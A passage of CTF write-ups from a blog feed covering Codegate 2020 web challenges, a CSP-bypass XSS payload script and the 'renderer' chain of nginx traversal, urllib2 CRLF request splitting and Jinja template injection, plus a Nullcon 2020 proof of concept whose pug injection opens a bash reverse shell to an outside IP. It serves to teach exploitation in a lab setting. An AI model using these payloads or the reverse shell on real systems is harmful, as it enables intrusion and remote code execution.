class="tag">&gt;</span></span><br></pre></td></tr></table></figure><p>In the <strong>body</strong> <strong>part</strong>, <strong>regular expression verification</strong> prevents the insertion of html tags, but this is an incorrect regular expression, which can be bypassed through inserting <strong>a new line character</strong>.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Security-Policy: default-src 'self'; script-src 'none';"</span>);</span><br><span class="line">header(<span class="string">"HTTP/: 102"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>As the title, <strong>this challenge</strong> has <strong>the CSP settings</strong> as above <strong>to prevent XSS</strong> from occurring on the site.<br>However, the CSP may not work with some <strong>response status</strong>.<br>The api allows you to bypass the <strong>CSP</strong> by setting the <strong>response status</strong> to <strong>102</strong>.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">d1 = [<span class="string">'header'</span>, <span class="string">'HTTP/'</span>, <span class="string">'102'</span>]</span><br><span class="line">d2 = [<span class="string">'body'</span>, <span class="string">'&lt;script\n&gt;alert(origin)\n&lt;/script\n&gt;'</span>, <span class="string">''</span>]</span><br><span class="line"></span><br><span class="line">d1 = <span class="string">','</span>.join(b64encode(c.encode()).decode() <span class="keyword">for</span> c <span class="keyword">in</span> d1)</span><br><span class="line">d2 = <span class="string">','</span>.join(b64encode(c.encode()).decode() <span class="keyword">for</span> c <span class="keyword">in</span> d2)</span><br><span class="line"></span><br><span class="line">merged = <span class="string">'|&#123;&#125;|&#123;&#125;'</span>.format(d1, d2)</span><br><span class="line"></span><br><span class="line">[sig, value] = os.popen(<span class="string">"hashpump -s '697e91bd03ae11b196e095af93027e56' -d 'MQ==,Mg==,Mw==' -a '&#123;&#125;' -k 12"</span>.format(merged)).read().strip().split(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">q = b64encode(eval(<span class="string">"b'''"</span> + value + <span class="string">"'''"</span>)).decode()</span><br><span class="line"></span><br><span class="line">print(<span class="string">'http://110.10.147.166/api.php?sig=&#123;&#125;&amp;q=&#123;&#125;'</span>.format(sig, q))</span><br></pre></td></tr></table></figure><p>This is <strong>a payload script</strong> using the two techniques described above, and you can change the contents of the script <strong>by change d2</strong>.</p><p><strong>After configuring the script</strong> and send the cookie value to your server, you can check the flag at the cookie value by sending the generated address to admin via <strong>the website’s report function</strong>.</p><h2 id="750pts-renderer"><a href="#750pts-renderer" class="headerlink" title="[750pts] renderer"></a>[750pts] <a href="#renderer">renderer</a></h2><ul><li><a href="https://file.rwx.kr/ctf/2020/codegate/022fd23aa5d26fbeea4ea890710178e9.zip" target="_blank" rel="noopener">022fd23aa5d26fbeea4ea890710178e9.zip</a></li></ul><blockquote><p>Description :<br>It is my first flask project with nginx. Write your own message, and get flag!<br><a href="http://110.10.147.169/renderer/" target="_blank" rel="noopener">http://110.10.147.169/renderer/</a><br><a href="http://58.229.253.144/renderer/" target="_blank" rel="noopener">http://58.229.253.144/renderer/</a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// http://110.10.147.169/static../run.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">service nginx stop</span><br><span class="line">mv /etc/nginx/sites-enabled/default /tmp/</span><br><span class="line">mv /tmp/nginx-flask.conf /etc/nginx/sites-enabled/flask</span><br><span class="line"></span><br><span class="line">service nginx restart</span><br><span class="line"></span><br><span class="line">uwsgi /home/src/uwsgi.ini &amp;</span><br><span class="line">/bin/bash /home/cleaner.sh &amp;</span><br><span class="line"></span><br><span class="line">/bin/bash</span><br></pre></td></tr></table></figure><p>Although This server is a just only for this challenge, it is weird serviced by the flask app through <code>/render</code> paths rather than the root path.</p><p>The address <code>/static</code>, which is referenced on service page, allows users to browse the parent directory by an nginx misconfigure, which skill is well known, so I will skip the explanation.<br>An attacker will be able to navigate the /home path through the <code>/static../</code> path.</p><p>The <strong>Dockerfile</strong> given as an attachment indicates that <code>/home/src/</code> is the source directory for this flask app.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// http://<span class="number">110.10</span><span class="number">.147</span><span class="number">.169</span>/static../src/app/__init__.py</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> routes</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.url_map.strict_slashes = <span class="literal">False</span></span><br><span class="line">app.register_blueprint(routes.front, url_prefix=<span class="string">"/renderer"</span>)</span><br><span class="line">app.config[<span class="string">"FLAG"</span>] = os.getenv(<span class="string">"FLAG"</span>, <span class="string">"CODEGATE2020&#123;&#125;"</span>)</span><br></pre></td></tr></table></figure><p><code>/src/app/_init__.py</code> file indicates that the flag passed to the environment variable from Dockerfile via the <strong>ENV</strong> command was set in the <code>app.config[&quot;FLAG&quot;]</code> property of the flask app.</p><p>Also, <code>from app import routes</code> make us know that <code>routes.py</code> has a routing implementation source.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">// http://<span class="number">110.10</span><span class="number">.147</span><span class="number">.169</span>/static../src/app/routes.py</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, render_template_string, request, redirect, abort, Blueprint</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> path</span><br><span class="line"><span class="keyword">from</span> urlparse <span class="keyword">import</span> urlparse</span><br><span class="line"></span><br><span class="line">front = Blueprint(<span class="string">"renderer"</span>, __name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.before_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    print(request.url)</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.route("/", methods=["GET", "POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">"GET"</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>)</span><br><span class="line"></span><br><span class="line">    url = request.form.get(<span class="string">"url"</span>)</span><br><span class="line">    res = proxy_read(url) <span class="keyword">if</span> url <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> res:</span><br><span class="line">        abort(<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>, data = res)</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.route("/whatismyip", methods=["GET"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ipcheck</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"ip.html"</span>, ip = get_ip(), real_ip = get_real_ip())</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.route("/admin", methods=["GET"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_access</span><span class="params">()</span>:</span></span><br><span class="line">    ip = get_ip()</span><br><span class="line">    rip = get_real_ip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">"127.0.0.1"</span>, <span class="string">"127.0.0.2"</span>]: <span class="comment">#super private ip :)</span></span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip != rip: <span class="comment">#if use proxy</span></span><br><span class="line">        ticket = write_log(rip)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">"admin_remote.html"</span>, ticket = ticket)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> ip == <span class="string">"127.0.0.2"</span> <span class="keyword">and</span> request.args.get(<span class="string">"body"</span>):</span><br><span class="line">            ticket = write_extend_log(rip, request.args.get(<span class="string">"body"</span>))</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">"admin_local.html"</span>, ticket = ticket)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">"admin_local.html"</span>, ticket = <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.route("/admin/ticket", methods=["GET"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_ticket</span><span class="params">()</span>:</span></span><br><span class="line">    ip = get_ip()</span><br><span class="line">    rip = get_real_ip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip != rip: <span class="comment">#proxy doesn't allow to show ticket</span></span><br><span class="line">        <span class="keyword">print</span> <span class="number">1</span></span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">"127.0.0.1"</span>, <span class="string">"127.0.0.2"</span>]: <span class="comment">#only local</span></span><br><span class="line">        <span class="keyword">print</span> <span class="number">2</span></span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    <span class="keyword">if</span> request.headers.get(<span class="string">"User-Agent"</span>) != <span class="string">"AdminBrowser/1.337"</span>:</span><br><span class="line">        <span class="keyword">print</span> request.headers.get(<span class="string">"User-Agent"</span>)</span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">"ticket"</span>):</span><br><span class="line">        log = read_log(request.args.get(<span class="string">"ticket"</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> log:</span><br><span class="line">            <span class="keyword">print</span> <span class="number">4</span></span><br><span class="line">            abort(<span class="number">403</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template_string(log)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> request.remote_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_real_ip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> request.headers.get(<span class="string">"X-Forwarded-For"</span>) <span class="keyword">or</span> get_ip()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proxy_read</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="comment">#TODO : implement logging</span></span><br><span class="line"></span><br><span class="line">    s = urlparse(url).scheme</span><br><span class="line">    <span class="keyword">if</span> s <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">"http"</span>, <span class="string">"https"</span>]: <span class="comment">#sjgdmfRk akfRk</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> urllib2.urlopen(url).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_log</span><span class="params">(rip)</span>:</span></span><br><span class="line">    tid = hashlib.sha1(str(time.time()) + rip).hexdigest()</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"/home/tickets/%s"</span> % tid, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        log_str = <span class="string">"Admin page accessed from %s"</span> % rip</span><br><span class="line">        f.write(log_str)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tid</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_extend_log</span><span class="params">(rip, body)</span>:</span></span><br><span class="line">    tid = hashlib.sha1(str(time.time()) + rip).hexdigest()</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"/home/tickets/%s"</span> % tid, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(body)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tid</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_log</span><span class="params">(ticket)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (ticket <span class="keyword">and</span> ticket.isalnum()):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> path.exists(<span class="string">"/home/tickets/%s"</span> % ticket):</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">"/home/tickets/%s"</span> % ticket, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">return</span> f.read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>The <code>/home/src/app/routes.py</code> identifies the features and vulnerabilities of the website.</p><p>When requested by specifying an X-Forwarded-For header that is not a value of <strong>127.0.0.1</strong> or <strong>127.0.0.2</strong> in the path <code>/admin</code>, a file containing the contents of the <code>X-Forwarded-For</code> is created through the write_log function in the <code>/home/tickets</code> directory and returned to the filename.</p><p>In the admin_ticket function corresponding to the <code>/admin/ticket</code> path, read the delivered ticket and execute the factor_template_string function. As a result, <strong>Jinja SSTI</strong> is available for this issue.</p><ul><li><a href="https://www.cvedetails.com/cve/CVE-2019-9740/" target="_blank" rel="noopener">https://www.cvedetails.com/cve/CVE-2019-9740/</a></li></ul><p>The http request function, which is the main feature of the problem, is through the old version of <strong>urlib2</strong> library. (The Python version is listed in the attached Dockerfile) <strong>A CRLF vulnerability</strong> exists in that version of urlib2, which enables http request splitting.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">[REQUEST]</span><br><span class="line">POST /renderer/ HTTP/1.1</span><br><span class="line">Host: 110.10.147.169</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 84</span><br><span class="line"></span><br><span class="line">url=http://localhost/renderer/admin HTTP/1.1</span><br><span class="line">X-Forwarded-For: applemint</span><br><span class="line">X-Ignore: </span><br><span class="line"></span><br><span class="line">[RESPONSE]</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Codegate20 Proxy Service<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span>Codegate '20 Proxy Admin Page<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/static/img/admin_is_watching_you.jpg"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">            Your access log is written with ticket no e05c0b2a191386ab2b6ff732f2e8c199e0ce18b4</span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://code.jquery.com/jquery-3.4.1.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>You can create a file at <code>/home/tickets/</code> with any request like this and get the file name. In this case, the ticket file is <code>/home/tickets/e05c0b2a191386ab2b6ff732f2e8c199e0ce18b4</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; http:&#x2F;&#x2F;110.10.147.169&#x2F;static..&#x2F;tickets&#x2F;e05c0b2a191386ab2b6ff732f2e8c199e0ce18b4</span><br><span class="line">Admin page accessed from applemint</span><br></pre></td></tr></table></figure><p>You can view the contents of the saved ticket file using the nginx route bug as described above.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[REQUEST]</span><br><span class="line">POST /renderer/ HTTP/1.1</span><br><span class="line">Host: 110.10.147.169</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 194</span><br><span class="line"></span><br><span class="line">url=http://localhost/renderer/admin/ticket?ticket=e05c0b2a191386ab2b6ff732f2e8c199e0ce18b4 HTTP/1.1</span><br><span class="line">Host: x</span><br><span class="line">User-Agent: AdminBrowser/1.337</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x</span><br><span class="line"></span><br><span class="line">[RESPONSE]</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"proxy-body"</span>&gt;</span></span><br><span class="line">    Admin page accessed from applemint</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>The request split vulnerability allows full manipulation of the contents of packets.<br>When you pass the parameter to the /admin/ticket path as GET, the contents of the ticket file appear rendered as a template.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[REQUEST]</span><br><span class="line">POST /renderer/ HTTP/1.1</span><br><span class="line">Host: 110.10.147.169</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 90</span><br><span class="line"></span><br><span class="line">url=http://localhost/renderer/admin HTTP/1.1</span><br><span class="line">X-Forwarded-For: &#123;&#123;config.FLAG&#125;&#125;</span><br><span class="line">X-Ignore: </span><br><span class="line"></span><br><span class="line">[RESPONSE]</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">    Your access log is written with ticket no 6f99f4a313a094964d38e793a99a339acdaac3be</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>From <code>/home/src/app/__init__.py</code>, we could know the flag is stored in <code>config.FLAG</code> . So <code>{{config.Flags}}</code> template string means</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[REQUEST]</span><br><span class="line">POST /renderer/ HTTP/1.1</span><br><span class="line">Host: 110.10.147.169</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 194</span><br><span class="line"></span><br><span class="line">url=http://localhost/renderer/admin/ticket?ticket=6f99f4a313a094964d38e793a99a339acdaac3be HTTP/1.1</span><br><span class="line">Host: x</span><br><span class="line">User-Agent: AdminBrowser/1.337</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x</span><br><span class="line"></span><br><span class="line">[RESPONSE]</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"proxy-body"</span>&gt;</span></span><br><span class="line">    Admin page accessed from CODEGATE2020&#123;CrLfMakesLocalGreatAgain&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>{{config.Flags}}</code> can be verified by rendering templates with tickets where FLAG contents are stored.</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Codegate CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nullcon HackIM 2020 - split second</title>
      <link href="/nullcon-hackim-2020-split-second/"/>
      <url>/nullcon-hackim-2020-split-second/</url>
      
        <content type="html"><![CDATA[<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">'bash -i &gt;&amp; /dev/tcp/15.165.0.114/9999 0&gt;&amp;1'</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"process.binding('spawn_sync').spawn(&#123;file:'bash',args:['/bin/bash','-c','%s'],envPairs:['y='],stdio:[&#123;type:'pipe',readable:1&#125;]&#125;)"</span> % (cmd)</span><br><span class="line">payload = <span class="string">''</span>.join(<span class="string">'\\'</span> + oct(ord(c))[<span class="number">2</span>:] <span class="keyword">for</span> c <span class="keyword">in</span> payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">''' HTTP/1.1</span></span><br><span class="line"><span class="string">Host: x</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /flag HTTP/1.1</span></span><br><span class="line"><span class="string">Host: x</span></span><br><span class="line"><span class="string">adminauth: secretpassword</span></span><br><span class="line"><span class="string">pug: #&#123;[]["\146\151\154\164\145\162"]["\143\157\156\163\164\162\165\143\164\157\162"]("%s")()&#125;</span></span><br><span class="line"><span class="string">x:'''</span> % (payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span>.join(chr(int(<span class="string">'0xff'</span> + hex(ord(c))[<span class="number">2</span>:].zfill(<span class="number">2</span>), <span class="number">16</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> payload)</span><br><span class="line">print(<span class="string">'http://web2.ctf.nullcon.net:8081/core?q='</span> + urllib.parse.quote(payload))</span><br></pre></td></tr></table></figure><p>Cause of the server has closed, only the POC is attached briefly.<br>Main idea of this challenge, is unicode failure bug by the node v8 version of nodejs http module. and pug module template injection leads to remote code execution.</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sandbox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>prompt.ml Solution</title>
      <link href="/prompt-ml-solution/"/>
      <url>/prompt-ml-solution/</url>
      
